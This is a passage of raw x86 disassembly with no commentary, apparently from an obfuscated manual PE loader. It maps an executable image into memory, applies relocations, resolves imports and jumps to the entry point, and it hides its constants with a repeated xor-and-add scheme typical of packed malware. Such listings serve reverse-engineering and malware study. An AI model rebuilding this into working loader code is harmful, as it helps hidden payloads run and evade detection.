  4269b9:	ret    0x4
  4269bc:	push   ebp
  4269bd:	mov    ebp,esp
  4269bf:	sub    esp,0x70
  4269c2:	and    DWORD PTR [ebp-0x20],0x0
  4269c6:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  4269cd:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  4269d4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4269db:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4269e2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4269e9:	mov    eax,DWORD PTR [ebp+0x20]
  4269ec:	mov    eax,DWORD PTR [eax+0x194]
  4269f2:	mov    DWORD PTR [ebp-0xc],eax
  4269f5:	mov    eax,DWORD PTR [ebp+0x20]
  4269f8:	push   ebx
  4269f9:	push   esi
  4269fa:	mov    esi,DWORD PTR [eax+0x190]
  426a00:	mov    eax,DWORD PTR [ebp+0x20]
  426a03:	mov    eax,DWORD PTR [eax+0x18c]
  426a09:	mov    DWORD PTR [ebp-0x8],eax
  426a0c:	mov    eax,DWORD PTR [eax]
  426a0e:	push   edi
  426a0f:	mov    DWORD PTR [ebp-0x4],esi
  426a12:	test   eax,eax
  426a14:	jne    0x426a21
  426a16:	push   DWORD PTR [ebp+0x1c]
  426a19:	mov    edx,DWORD PTR [ebp+0x20]
  426a1c:	call   0x426960
  426a21:	mov    eax,DWORD PTR [esi]
  426a23:	mov    ebx,DWORD PTR [esi]
  426a25:	add    ebx,DWORD PTR [eax+0x3c]
  426a28:	mov    eax,DWORD PTR [ebp+0xc]
  426a2b:	mov    ecx,DWORD PTR [ebp-0x8]
  426a2e:	mov    ecx,DWORD PTR [ecx]
  426a30:	mov    esi,0x75108aa
  426a35:	xor    eax,esi
  426a37:	mov    edi,0x3272f1
  426a3c:	add    eax,edi
  426a3e:	cmp    eax,ecx
  426a40:	jne    0x426c78
  426a46:	mov    eax,DWORD PTR [ebp-0xc]
  426a49:	mov    eax,DWORD PTR [eax]
  426a4b:	mov    DWORD PTR [ebp-0x10],eax
  426a4e:	mov    eax,DWORD PTR [ebx+0x50]
  426a51:	mov    DWORD PTR [ebp-0x68],eax
  426a54:	mov    eax,DWORD PTR [ebp-0x18]
  426a57:	xor    eax,esi
  426a59:	add    eax,edi
  426a5b:	mov    DWORD PTR [ebp-0x64],eax
  426a5e:	mov    eax,DWORD PTR [ebp-0x14]
  426a61:	and    DWORD PTR [ebp-0x6c],0x0
  426a65:	xor    eax,esi
  426a67:	add    eax,edi
  426a69:	mov    DWORD PTR [ebp-0x60],eax
  426a6c:	lea    eax,[ebp-0x70]
  426a6f:	push   eax
  426a70:	mov    eax,DWORD PTR [ebp+0x8]
  426a73:	xor    eax,esi
  426a75:	add    eax,edi
  426a77:	push   eax
  426a78:	mov    eax,DWORD PTR [ebp+0x20]
  426a7b:	add    eax,0xaa
  426a80:	push   eax
  426a81:	mov    eax,DWORD PTR [ebp+0x20]
  426a84:	mov    eax,DWORD PTR [eax+0x198]
  426a8a:	mov    DWORD PTR [ebp-0x70],0x4
  426a91:	push   DWORD PTR [eax]
  426a93:	mov    eax,DWORD PTR [ebp+0x10]
  426a96:	call   eax
  426a98:	mov    ecx,DWORD PTR [ebp-0xc]
  426a9b:	mov    ecx,DWORD PTR [ecx]
  426a9d:	mov    edx,DWORD PTR [ebp-0x8]
  426aa0:	mov    DWORD PTR [ebp-0x6c],eax
  426aa3:	mov    DWORD PTR [ebp+0x1c],eax
  426aa6:	mov    DWORD PTR [edx],ecx
  426aa8:	mov    ecx,DWORD PTR [ebp-0x4]
  426aab:	mov    DWORD PTR [ecx],eax
  426aad:	mov    eax,DWORD PTR [ebx+0x50]
  426ab0:	mov    DWORD PTR [ebp-0x68],eax
  426ab3:	mov    eax,DWORD PTR [ebp-0x1c]
  426ab6:	xor    eax,esi
  426ab8:	add    eax,edi
  426aba:	mov    DWORD PTR [ebp-0x64],eax
  426abd:	lea    eax,[ebp-0x20]
  426ac0:	mov    DWORD PTR [ebp-0x60],eax
  426ac3:	lea    eax,[ebp-0x70]
  426ac6:	push   eax
  426ac7:	mov    eax,DWORD PTR [ebp+0x8]
  426aca:	xor    eax,esi
  426acc:	add    eax,edi
  426ace:	push   eax
  426acf:	mov    eax,DWORD PTR [ebp+0x20]
  426ad2:	add    eax,0xee
  426ad7:	push   eax
  426ad8:	mov    eax,DWORD PTR [ebp+0x20]
  426adb:	mov    eax,DWORD PTR [eax+0x198]
  426ae1:	mov    DWORD PTR [ebp-0x70],0x4
  426ae8:	push   DWORD PTR [eax]
  426aea:	mov    eax,DWORD PTR [ebp+0x10]
  426aed:	call   eax
  426aef:	test   eax,eax
  426af1:	je     0x426b16
  426af3:	and    DWORD PTR [ebp+0xc],0x0
  426af7:	cmp    DWORD PTR [ebx+0x50],0x0
  426afb:	jbe    0x426b16
  426afd:	mov    eax,DWORD PTR [ebp+0x1c]
  426b00:	mov    ecx,DWORD PTR [ebp-0x10]
  426b03:	sub    ecx,eax
  426b05:	mov    dl,BYTE PTR [ecx+eax*1]
  426b08:	inc    DWORD PTR [ebp+0xc]
  426b0b:	mov    BYTE PTR [eax],dl
  426b0d:	mov    edx,DWORD PTR [ebp+0xc]
  426b10:	inc    eax
  426b11:	cmp    edx,DWORD PTR [ebx+0x50]
  426b14:	jb     0x426b05
  426b16:	mov    edx,DWORD PTR [ebp+0x1c]
  426b19:	mov    ecx,DWORD PTR [edx+0x3c]
  426b1c:	add    ecx,edx
  426b1e:	mov    eax,DWORD PTR [ecx+0xa0]
  426b24:	mov    ebx,DWORD PTR [ecx+0x28]
  426b27:	add    eax,edx
  426b29:	sub    edx,DWORD PTR [ebp-0x10]
  426b2c:	add    ebx,DWORD PTR [ebp+0x1c]
  426b2f:	mov    DWORD PTR [ebp+0xc],edx
  426b32:	mov    DWORD PTR [ebp-0x2c],ecx
  426b35:	mov    DWORD PTR [ebp-0x14],ebx
  426b38:	mov    DWORD PTR [ebp-0x8],0x0
  426b3f:	jmp    0x426bbb
  426b41:	add    edx,0xfffffff8
  426b44:	shr    edx,1
  426b46:	mov    DWORD PTR [ebp-0x18],edx
  426b49:	je     0x426ba7
  426b4b:	lea    edx,[eax+0x8]
  426b4e:	mov    DWORD PTR [ebp-0x4],edx
  426b51:	mov    edx,DWORD PTR [ebp-0x18]
  426b54:	mov    DWORD PTR [ebp-0x18],edx
  426b57:	mov    edx,DWORD PTR [ebp-0x4]
  426b5a:	movzx  edx,WORD PTR [edx]
  426b5d:	mov    DWORD PTR [ebp-0x24],edx
  426b60:	and    edx,0xfff
  426b66:	mov    DWORD PTR [ebp-0x28],edx
  426b69:	mov    edx,DWORD PTR [ebp-0x24]
  426b6c:	shr    edx,0xc
  426b6f:	add    edx,0xffcd8d0f
  426b75:	xor    edx,esi
  426b77:	cmp    edx,0xf89c85b8
  426b7d:	jne    0x426b9e
  426b7f:	mov    edx,DWORD PTR [ebp-0x28]
  426b82:	add    edx,DWORD PTR [ebp+0x1c]
  426b85:	mov    ebx,DWORD PTR [eax]
  426b87:	cmp    DWORD PTR [ebx+edx*1],0x0
  426b8b:	je     0x426b9b
  426b8d:	mov    ecx,DWORD PTR [ebp+0xc]
  426b90:	add    ecx,DWORD PTR [ebx+edx*1]
  426b93:	mov    ebx,DWORD PTR [eax]
  426b95:	mov    DWORD PTR [edx+ebx*1],ecx
  426b98:	mov    ecx,DWORD PTR [ebp-0x2c]
  426b9b:	mov    ebx,DWORD PTR [ebp-0x14]
  426b9e:	add    DWORD PTR [ebp-0x4],0x2
  426ba2:	dec    DWORD PTR [ebp-0x18]
  426ba5:	jne    0x426b57
  426ba7:	mov    edx,DWORD PTR [ebp-0xc]
  426baa:	add    DWORD PTR [ebp-0x8],edx
  426bad:	mov    edx,DWORD PTR [ebp-0x8]
  426bb0:	cmp    edx,DWORD PTR [ecx+0xa4]
  426bb6:	jae    0x426bc9
  426bb8:	add    eax,DWORD PTR [ebp-0xc]
  426bbb:	mov    edx,DWORD PTR [eax+0x4]
  426bbe:	mov    DWORD PTR [ebp-0xc],edx
  426bc1:	test   edx,edx
  426bc3:	jne    0x426b41
  426bc9:	mov    eax,DWORD PTR [ebp-0x10]
  426bcc:	mov    DWORD PTR [ebp-0x6c],eax
  426bcf:	mov    DWORD PTR [ebp-0x70],0x4
  426bd6:	mov    eax,DWORD PTR [ecx+0x50]
  426bd9:	mov    DWORD PTR [ebp-0x68],eax
  426bdc:	mov    eax,DWORD PTR [ebp-0x1c]
  426bdf:	xor    eax,esi
  426be1:	add    eax,edi
  426be3:	mov    DWORD PTR [ebp-0x64],eax
  426be6:	lea    eax,[ebp-0x20]
  426be9:	mov    DWORD PTR [ebp-0x60],eax
  426bec:	lea    eax,[ebp-0x70]
  426bef:	push   eax
  426bf0:	mov    eax,DWORD PTR [ebp+0x8]
  426bf3:	xor    eax,esi
  426bf5:	add    eax,edi
  426bf7:	push   eax
  426bf8:	mov    eax,DWORD PTR [ebp+0x20]
  426bfb:	add    eax,0xee
  426c00:	push   eax
  426c01:	mov    eax,DWORD PTR [ebp+0x20]
  426c04:	mov    eax,DWORD PTR [eax+0x198]
  426c0a:	push   DWORD PTR [eax]
  426c0c:	mov    eax,DWORD PTR [ebp+0x10]
  426c0f:	call   eax
  426c11:	mov    eax,DWORD PTR [ebp+0x20]
  426c14:	mov    eax,DWORD PTR [eax+0x180]
  426c1a:	add    eax,DWORD PTR [ebp+0xc]
  426c1d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c20:	push   DWORD PTR [ebp+0x18]
  426c23:	mov    DWORD PTR [eax],ecx
  426c25:	push   DWORD PTR [ebp+0x14]
  426c28:	push   DWORD PTR [ebp+0x1c]
  426c2b:	call   ebx
  426c2d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c30:	add    ecx,DWORD PTR [ebp+0x20]
  426c33:	lea    eax,[ebp+0x4]
  426c36:	mov    DWORD PTR [ebp+0x20],ecx
  426c39:	mov    ecx,DWORD PTR [ebp+0x20]
  426c3c:	mov    ecx,DWORD PTR [ebp+0x20]
  426c3f:	mov    edx,DWORD PTR [ecx+0x190]
  426c45:	mov    ecx,DWORD PTR [ebp+0x20]
  426c48:	mov    ecx,DWORD PTR [ecx+0x18c]
  426c4e:	mov    esi,DWORD PTR [ecx]
  426c50:	cmp    DWORD PTR [eax],esi
  426c52:	jb     0x426c73
  426c54:	mov    esi,DWORD PTR [edx]
  426c56:	mov    edi,DWORD PTR [edx]
  426c58:	mov    esi,DWORD PTR [esi+0x3c]
  426c5b:	lea    esi,[edi+esi*1+0x50]
  426c5f:	mov    edi,DWORD PTR [ecx]
  426c61:	add    edi,DWORD PTR [esi]
  426c63:	cmp    DWORD PTR [eax],edi
  426c65:	jae    0x426c73
  426c67:	mov    esi,DWORD PTR [ecx]
  426c69:	mov    ecx,DWORD PTR [eax]
  426c6b:	mov    edx,DWORD PTR [edx]
  426c6d:	sub    ecx,esi
  426c6f:	add    edx,ecx
  426c71:	mov    DWORD PTR [eax],edx
  426c73:	mov    eax,DWORD PTR [ebp+0xc]
  426c76:	jmp    0x426c7a
  426c78:	xor    eax,eax
  426c7a:	pop    edi
  426c7b:	pop    esi
  426c7c:	pop    ebx
  426c7d:	leave  
  426c7e:	ret    0x1c
  426c81:	push   ebp
  426c82:	mov    ebp,esp
  426c84:	sub    esp,0x1c
  426c87:	push   esi
  426c88:	mov    esi,eax
  426c8a:	mov    eax,DWORD PTR [ecx+0x190]
  426c90:	cmp    DWORD PTR [eax],0x0
  426c93:	je     0x426da3
  426c99:	test   edx,edx
  426c9b:	je     0x426da3
  426ca1:	test   esi,esi
  426ca3:	je     0x426da3
  426ca9:	mov    eax,DWORD PTR [esi+0x88]
  426caf:	test   eax,eax
  426cb1:	je     0x426d9e
  426cb7:	cmp    DWORD PTR [esi+0x8c],0x10
  426cbe:	je     0x426d9e
  426cc4:	cmp    DWORD PTR [esi+0x34],edx
  426cc7:	je     0x426d9e
  426ccd:	mov    esi,DWORD PTR [ecx+0x18c]
  426cd3:	and    DWORD PTR [ebp-0x10],0x0
  426cd7:	mov    ecx,edx
  426cd9:	sub    ecx,DWORD PTR [esi]
  426cdb:	add    eax,edx
  426cdd:	movzx  edx,WORD PTR [eax+0xc]
  426ce1:	mov    DWORD PTR [ebp-0x1c],ecx
  426ce4:	movzx  ecx,WORD PTR [eax+0xe]
  426ce8:	add    ecx,edx
  426cea:	je     0x426d9e
  426cf0:	lea    ecx,[eax+0x14]
  426cf3:	push   ebx
  426cf4:	mov    DWORD PTR [ebp-0x18],ecx
  426cf7:	mov    esi,0x7fffffff
  426cfc:	push   edi
  426cfd:	test   DWORD PTR [ecx],esi
  426cff:	je     0x426d80
  426d01:	mov    edx,DWORD PTR [ecx]
  426d03:	and    DWORD PTR [ebp-0xc],0x0
  426d07:	and    edx,esi
  426d09:	add    edx,eax
  426d0b:	movzx  edi,WORD PTR [edx+0xe]
  426d0f:	movzx  ebx,WORD PTR [edx+0xc]
  426d13:	add    edi,ebx
  426d15:	je     0x426d80
  426d17:	lea    ecx,[edx+0x14]
  426d1a:	mov    DWORD PTR [ebp-0x14],ecx
  426d1d:	test   DWORD PTR [ecx],esi
  426d1f:	je     0x426d62
  426d21:	mov    ecx,DWORD PTR [ecx]
  426d23:	and    DWORD PTR [ebp-0x8],0x0
  426d27:	and    ecx,esi
  426d29:	add    ecx,eax
  426d2b:	movzx  edi,WORD PTR [ecx+0xe]
  426d2f:	movzx  ebx,WORD PTR [ecx+0xc]
  426d33:	add    edi,ebx
  426d35:	je     0x426d62
  426d37:	lea    edi,[ecx+0x14]
  426d3a:	mov    DWORD PTR [ebp-0x4],edi
  426d3d:	mov    edi,DWORD PTR [ebp-0x4]
  426d40:	mov    edi,DWORD PTR [edi]
  426d42:	test   edi,edi
  426d44:	je     0x426d4c
  426d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  426d49:	add    DWORD PTR [edi+eax*1],ebx
  426d4c:	movzx  edi,WORD PTR [ecx+0xe]
  426d50:	movzx  ebx,WORD PTR [ecx+0xc]
  426d54:	inc    DWORD PTR [ebp-0x8]
  426d57:	add    DWORD PTR [ebp-0x4],0x8
  426d5b:	add    edi,ebx
  426d5d:	cmp    DWORD PTR [ebp-0x8],edi
  426d60:	jb     0x426d3d
  426d62:	movzx  edi,WORD PTR [edx+0xe]
  426d66:	movzx  ebx,WORD PTR [edx+0xc]
  426d6a:	mov    ecx,DWORD PTR [ebp-0x14]
  426d6d:	inc    DWORD PTR [ebp-0xc]
  426d70:	add    ecx,0x8
  426d73:	add    edi,ebx
  426d75:	mov    DWORD PTR [ebp-0x14],ecx
  426d78:	cmp    DWORD PTR [ebp-0xc],edi
  426d7b:	jb     0x426d1d
  426d7d:	mov    ecx,DWORD PTR [ebp-0x18]
  426d80:	movzx  edx,WORD PTR [eax+0xe]
  426d84:	movzx  edi,WORD PTR [eax+0xc]
  426d88:	inc    DWORD PTR [ebp-0x10]
  426d8b:	add    ecx,0x8
  426d8e:	add    edx,edi
  426d90:	mov    DWORD PTR [ebp-0x18],ecx
  426d93:	cmp    DWORD PTR [ebp-0x10],edx
  426d96:	jb     0x426cfd
  426d9c:	pop    edi
  426d9d:	pop    ebx
  426d9e:	xor    eax,eax
  426da0:	inc    eax
  426da1:	jmp    0x426da5
  426da3:	xor    eax,eax
  426da5:	pop    esi
  426da6:	leave  
  426da7:	ret    
  426da8:	push   ebp
  426da9:	mov    ebp,esp
  426dab:	mov    ecx,DWORD PTR [ecx+0x190]
  426db1:	mov    eax,DWORD PTR [ebp+0xc]
  426db4:	sub    esp,0x10
  426db7:	push   ebx
  426db8:	xor    ebx,ebx
  426dba:	push   esi
  426dbb:	push   edi
  426dbc:	cmp    DWORD PTR [ecx],ebx
  426dbe:	je     0x426e46
  426dc4:	cmp    eax,ebx
  426dc6:	je     0x426e46
  426dc8:	cmp    DWORD PTR [eax+0x78],ebx
  426dcb:	jne    0x426dd2
  426dcd:	xor    eax,eax
  426dcf:	inc    eax
  426dd0:	jmp    0x426e48
  426dd2:	mov    eax,DWORD PTR [eax+0x78]
  426dd5:	add    eax,DWORD PTR [ebp+0x8]
  426dd8:	mov    ecx,DWORD PTR [eax+0x1c]
  426ddb:	mov    edx,DWORD PTR [eax+0x24]
  426dde:	mov    esi,DWORD PTR [eax+0x14]
  426de1:	mov    edi,DWORD PTR [eax+0x18]
  426de4:	add    ecx,DWORD PTR [ebp+0x8]
  426de7:	add    edx,DWORD PTR [ebp+0x8]
  426dea:	mov    DWORD PTR [ebp-0x4],esi
  426ded:	cmp    esi,edi
  426def:	ja     0x426df4
  426df1:	mov    DWORD PTR [ebp-0x4],edi
  426df4:	mov    DWORD PTR [ebp-0x8],ebx
  426df7:	cmp    DWORD PTR [ebp-0x4],ebx
  426dfa:	jbe    0x426dcd
  426dfc:	cmp    ebx,DWORD PTR [eax+0x14]
  426dff:	jae    0x426e07
  426e01:	movzx  esi,WORD PTR [edx+ebx*2]
  426e05:	jmp    0x426e09
  426e07:	mov    esi,ebx
  426e09:	lea    esi,[ecx+esi*4]
  426e0c:	mov    edi,DWORD PTR [esi]
  426e0e:	test   edi,edi
  426e10:	je     0x426e3b
  426e12:	add    edi,DWORD PTR [ebp+0x8]
  426e15:	mov    DWORD PTR [ebp-0x10],edi
  426e18:	cmp    edi,eax
  426e1a:	jbe    0x426e2c
  426e1c:	mov    ebx,DWORD PTR [ebp+0xc]
  426e1f:	mov    ebx,DWORD PTR [ebx+0x7c]
  426e22:	add    ebx,eax
  426e24:	cmp    edi,ebx
  426e26:	jae    0x426e2c
  426e28:	mov    esi,DWORD PTR [esi]
  426e2a:	jmp    0x426e34
  426e2c:	sub    edi,DWORD PTR [ebp+0x8]
  426e2f:	mov    DWORD PTR [esi],edi
  426e31:	mov    esi,DWORD PTR [ebp-0x10]
  426e34:	test   esi,esi
  426e36:	je     0x426e46
  426e38:	mov    ebx,DWORD PTR [ebp-0x8]
  426e3b:	inc    ebx
  426e3c:	mov    DWORD PTR [ebp-0x8],ebx
  426e3f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426e42:	jb     0x426dfc
  426e44:	jmp    0x426dcd
  426e46:	xor    eax,eax
  426e48:	pop    edi
  426e49:	pop    esi
  426e4a:	pop    ebx
  426e4b:	leave  
  426e4c:	ret    0x8
  426e4f:	push   ebp
  426e50:	mov    ebp,esp
  426e52:	sub    esp,0x2c
  426e55:	mov    edx,0xf89c85a5
  426e5a:	mov    DWORD PTR [ebp-0x4],edx
  426e5d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426e64:	mov    eax,DWORD PTR [ebp-0x4]
  426e67:	mov    ecx,DWORD PTR [ebp-0x4]
  426e6a:	mov    ecx,DWORD PTR [ebp-0x4]
  426e6d:	mov    ecx,DWORD PTR [ebp-0x4]
  426e70:	mov    ecx,DWORD PTR [ebp-0x4]
  426e73:	mov    ecx,DWORD PTR [ebp-0x4]
  426e76:	push   ebx
  426e77:	mov    ebx,DWORD PTR [ebp+0x10]
  426e7a:	push   esi
  426e7b:	mov    esi,0x75108aa
  426e80:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426e87:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8a:	mov    ebx,DWORD PTR [ebx+0x190]
  426e90:	push   edi
  426e91:	mov    edi,0x3272f1
  426e96:	xor    ecx,esi
  426e98:	xor    eax,esi
  426e9a:	add    eax,edi
  426e9c:	add    ecx,edi
  426e9e:	mov    DWORD PTR [ebp-0x18],eax
  426ea1:	cmp    ecx,DWORD PTR [ebx]
  426ea3:	je     0x427124
  426ea9:	mov    ebx,DWORD PTR [ebp-0x4]
  426eac:	mov    ecx,DWORD PTR [ebp+0xc]
  426eaf:	xor    ebx,esi
  426eb1:	add    ebx,edi
  426eb3:	cmp    ebx,ecx
  426eb5:	je     0x427124
  426ebb:	mov    ebx,DWORD PTR [ebp-0x4]
  426ebe:	mov    ecx,DWORD PTR [ecx+0x80]
  426ec4:	xor    ebx,esi
  426ec6:	add    ebx,edi
  426ec8:	cmp    ecx,ebx
  426eca:	je     0x42711f
  426ed0:	add    ecx,DWORD PTR [ebp+0x8]
  426ed3:	mov    DWORD PTR [ebp-0x2c],ecx
  426ed6:	mov    ebx,edx
  426ed8:	xor    ebx,esi
  426eda:	add    ebx,edi
  426edc:	mov    DWORD PTR [ebp-0x10],ebx
  426edf:	mov    ebx,DWORD PTR [ebp-0x10]
  426ee2:	cmp    ebx,edx
  426ee4:	je     0x426ef8
  426ee6:	mov    edx,DWORD PTR [ebp-0x10]
  426ee9:	mov    ebx,DWORD PTR [ebp-0x4]
  426eec:	imul   edx,edx,0x14
  426eef:	xor    ebx,esi
  426ef1:	add    ebx,edi
  426ef3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426ef6:	jne    0x426f0f
  426ef8:	mov    edx,DWORD PTR [ebp-0x10]
  426efb:	mov    ebx,DWORD PTR [ebp-0x4]
  426efe:	imul   edx,edx,0x14
  426f01:	xor    ebx,esi
  426f03:	add    ebx,edi
  426f05:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426f09:	je     0x427111
  426f0f:	mov    eax,DWORD PTR [ebp-0x4]
  426f12:	mov    ebx,DWORD PTR [ebp-0x4]
  426f15:	mov    eax,DWORD PTR [ebp-0x10]
  426f18:	imul   eax,eax,0x14
  426f1b:	add    eax,ecx
  426f1d:	mov    ecx,DWORD PTR [eax+0x10]
  426f20:	add    ecx,DWORD PTR [ebp+0x8]
  426f23:	xor    ebx,esi
  426f25:	mov    DWORD PTR [ebp-0x1c],ecx
  426f28:	mov    ecx,DWORD PTR [ebp-0x4]
  426f2b:	mov    edx,DWORD PTR [ebp-0x4]
  426f2e:	xor    ecx,esi
  426f30:	add    ecx,edi
  426f32:	xor    edx,esi
  426f34:	mov    DWORD PTR [ebp-0x24],ecx
  426f37:	mov    ecx,DWORD PTR [eax]
  426f39:	add    edx,edi
  426f3b:	add    ebx,edi
  426f3d:	cmp    ecx,edx
  426f3f:	je     0x426f47
  426f41:	add    ecx,DWORD PTR [ebp+0x8]
  426f44:	mov    DWORD PTR [ebp-0x24],ecx
  426f47:	mov    ecx,DWORD PTR [ebp-0x4]
  426f4a:	xor    ecx,esi
  426f4c:	add    ecx,DWORD PTR [eax+0xc]
  426f4f:	mov    eax,DWORD PTR [ebp+0x8]
  426f52:	lea    eax,[ecx+eax*1+0x3272f1]
  426f59:	mov    DWORD PTR [ebp+0xc],eax
  426f5c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426f63:	mov    eax,DWORD PTR [ebp+0x10]
  426f66:	push   DWORD PTR [ebp+0xc]
  426f69:	mov    eax,DWORD PTR [eax+0x1e0]
  426f6f:	call   DWORD PTR [eax]
  426f71:	mov    ecx,DWORD PTR [ebp-0x4]
  426f74:	xor    ecx,esi
  426f76:	add    ecx,edi
  426f78:	mov    DWORD PTR [ebp-0xc],eax
  426f7b:	cmp    ecx,eax
  426f7d:	jne    0x426f91
  426f7f:	mov    eax,DWORD PTR [ebp+0x10]
  426f82:	push   DWORD PTR [ebp+0xc]
  426f85:	mov    eax,DWORD PTR [eax+0x1e0]
  426f8b:	call   DWORD PTR [eax+0xc]
  426f8e:	mov    DWORD PTR [ebp-0xc],eax
  426f91:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426f98:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426f9f:	mov    eax,DWORD PTR [ebp-0x4]
  426fa2:	xor    eax,esi
  426fa4:	add    eax,edi
  426fa6:	cmp    eax,DWORD PTR [ebp-0xc]
  426fa9:	jne    0x426fce
  426fab:	mov    eax,DWORD PTR [ebp-0x8]
  426fae:	mov    ecx,DWORD PTR [ebp-0x20]
  426fb1:	xor    eax,esi
  426fb3:	xor    ecx,esi
  426fb5:	lea    ebx,[ebx+eax*1+0x3272f1]
  426fbc:	mov    eax,DWORD PTR [ebp+0x10]
  426fbf:	mov    eax,DWORD PTR [eax+0x1e0]
  426fc5:	add    ecx,edi
  426fc7:	imul   ecx,ebx
  426fca:	push   ecx
  426fcb:	call   DWORD PTR [eax+0x24]
  426fce:	mov    eax,DWORD PTR [ebp-0x4]
  426fd1:	xor    eax,esi
  426fd3:	add    eax,edi
  426fd5:	cmp    eax,DWORD PTR [ebp-0xc]
  426fd8:	jne    0x426fe9
  426fda:	mov    eax,DWORD PTR [ebp-0x28]
  426fdd:	xor    eax,esi
  426fdf:	add    eax,edi
  426fe1:	cmp    ebx,eax
  426fe3:	jbe    0x426f63
  426fe9:	mov    eax,DWORD PTR [ebp-0x4]
  426fec:	xor    eax,esi
  426fee:	add    eax,edi
  426ff0:	cmp    eax,DWORD PTR [ebp-0xc]
  426ff3:	jne    0x42700c
  426ff5:	mov    eax,DWORD PTR [ebp-0x8]
  426ff8:	mov    ecx,DWORD PTR [ebp-0x18]
  426ffb:	xor    eax,esi
  426ffd:	lea    eax,[ecx+eax*1+0x3272f1]
  427004:	mov    DWORD PTR [ebp-0x18],eax
  427007:	jmp    0x4270fb
  42700c:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427013:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  42701a:	mov    ebx,DWORD PTR [ebp-0x4]
  42701d:	xor    ebx,esi
  42701f:	add    ebx,edi
  427021:	jmp    0x4270e8
  427026:	mov    eax,DWORD PTR [ebp-0x4]
  427029:	xor    eax,esi
  42702b:	add    eax,edi
  42702d:	mov    DWORD PTR [ebp-0x14],eax
  427030:	mov    eax,DWORD PTR [ebp-0x4]
  427033:	xor    eax,esi
  427035:	add    eax,edi
  427037:	mov    DWORD PTR [ebp+0xc],eax
  42703a:	mov    ecx,DWORD PTR [ebp-0x4]
  42703d:	mov    eax,DWORD PTR [ebp-0x24]
  427040:	xor    ecx,esi
  427042:	add    ecx,edi
  427044:	cmp    ecx,eax
  427046:	je     0x42704e
  427048:	mov    eax,DWORD PTR [eax+ebx*4]
  42704b:	mov    DWORD PTR [ebp-0x14],eax
  42704e:	mov    eax,DWORD PTR [ebp-0x1c]
  427051:	mov    eax,DWORD PTR [eax+ebx*4]
  427054:	mov    DWORD PTR [ebp+0xc],eax
  427057:	mov    eax,DWORD PTR [ebp-0x4]
  42705a:	mov    ecx,DWORD PTR [ebp-0x14]
  42705d:	xor    eax,esi
  42705f:	add    eax,edi
  427061:	cmp    eax,ecx
  427063:	je     0x42708e
  427065:	mov    eax,DWORD PTR [ebp-0x4]
  427068:	mov    ecx,DWORD PTR [ebp-0x14]
  42706b:	xor    eax,esi
  42706d:	add    eax,edi
  42706f:	shr    ecx,0x1f
  427072:	cmp    eax,ecx
  427074:	je     0x42708e
  427076:	mov    ecx,DWORD PTR [ebp-0x14]
  427079:	mov    eax,DWORD PTR [ebp+0x10]
  42707c:	mov    eax,DWORD PTR [eax+0x1e0]
  427082:	movzx  ecx,cx
  427085:	push   ecx
  427086:	push   DWORD PTR [ebp-0xc]
  427089:	call   DWORD PTR [eax+0x8]
  42708c:	jmp    0x4270a7
  42708e:	mov    eax,DWORD PTR [ebp+0xc]
  427091:	add    eax,DWORD PTR [ebp+0x8]
  427094:	mov    ecx,DWORD PTR [ebp+0x10]
  427097:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42709d:	add    eax,0x2
  4270a0:	push   eax
  4270a1:	push   DWORD PTR [ebp-0xc]
  4270a4:	call   DWORD PTR [ecx+0x8]
  4270a7:	mov    DWORD PTR [ebp+0xc],eax
  4270aa:	mov    eax,DWORD PTR [ebp-0x4]
  4270ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4270b0:	xor    eax,esi
  4270b2:	add    eax,edi
  4270b4:	cmp    eax,ecx
  4270b6:	mov    eax,DWORD PTR [ebp-0x8]
  4270b9:	jne    0x4270cc
  4270bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4270be:	xor    eax,esi
  4270c0:	lea    eax,[ecx+eax*1+0x3272f1]
  4270c7:	mov    DWORD PTR [ebp-0x18],eax
  4270ca:	jmp    0x4270dc
  4270cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4270cf:	xor    eax,esi
  4270d1:	add    eax,edi
  4270d3:	imul   eax,ecx
  4270d6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270d9:	mov    DWORD PTR [ecx+ebx*4],eax
  4270dc:	mov    eax,DWORD PTR [ebp-0x8]
  4270df:	xor    eax,esi
  4270e1:	lea    ebx,[ebx+eax*1+0x3272f1]
  4270e8:	mov    eax,DWORD PTR [ebp-0x4]
  4270eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270ee:	xor    eax,esi
  4270f0:	add    eax,edi
  4270f2:	cmp    DWORD PTR [ecx+ebx*4],eax
  4270f5:	jne    0x427026
  4270fb:	mov    edx,DWORD PTR [ebp-0x10]
  4270fe:	mov    ecx,DWORD PTR [ebp-0x2c]
  427101:	mov    eax,DWORD PTR [ebp-0x18]
  427104:	sub    edx,0x3272f0
  42710a:	xor    edx,esi
  42710c:	jmp    0x426ed6
  427111:	mov    ecx,DWORD PTR [ebp-0x4]
  427114:	xor    ecx,esi
  427116:	add    ecx,edi
  427118:	cmp    eax,ecx
  42711a:	mov    eax,DWORD PTR [ebp-0x4]
  42711d:	jne    0x427127
  42711f:	mov    eax,DWORD PTR [ebp-0x8]
  427122:	jmp    0x427127
  427124:	mov    eax,DWORD PTR [ebp-0x4]
  427127:	xor    eax,esi
  427129:	add    eax,edi
  42712b:	pop    edi
  42712c:	pop    esi
  42712d:	pop    ebx
  42712e:	leave  
  42712f:	ret    0xc
  427132:	push   ebp
  427133:	mov    ebp,esp
  427135:	sub    esp,0x28
  427138:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
